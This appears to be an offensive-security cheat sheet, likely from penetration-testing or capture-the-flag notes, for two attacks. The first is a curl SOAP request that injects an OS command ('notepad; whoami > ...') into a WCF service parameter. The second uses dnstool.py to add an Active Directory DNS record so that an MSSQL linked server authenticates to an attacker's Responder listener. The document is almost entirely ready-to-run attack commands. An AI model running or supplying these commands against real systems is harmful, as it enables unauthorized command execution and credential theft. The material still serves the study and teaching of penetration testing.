# WCF SOAP Command Injection + DNS AD Record Hijack

Windows Communication Foundation (WCF) services may expose SOAP endpoints with command sinks. If the service parses parameters directly into shell commands, inject OS commands via SOAP body fields.

```bash
# Identify WCF service from .NET binary reverse engineering:
# Look for ServiceContract, OperationContract attributes in dotPeek/ILSpy
# Find the endpoint URL and binding type (BasicHttpBinding, NetTcpBinding)

# Craft SOAP request with command injection in a parameter:
curl -X POST http://<TARGET>/service.svc \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://tempuri.org/IService/KillProcess"' \
  --data '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body><KillProcess xmlns="http://tempuri.org/"><ProcessName>notepad; whoami > C:\\windows\\temp\\out.txt</ProcessName></KillProcess></s:Body></s:Envelope>'
```

DNS AD-integrated zone record injection for MSSQL linked server coerce:
```bash
# If linked server references a hostname that doesn't resolve, add an A record:
# Requires GenericWrite/CreateChild on the DNS zone object (not DNS Operators role)
dnstool.py -u '<domain>/<USER>' -p '<PASS>' -dc-ip <DC_IP> \
  -r '<unresolved-linked-server-hostname>' -d <LHOST> --action add -t A
# Then restart/reconnect MSSQL linked server to trigger outbound auth to your Responder
sudo responder -I <iface>
```
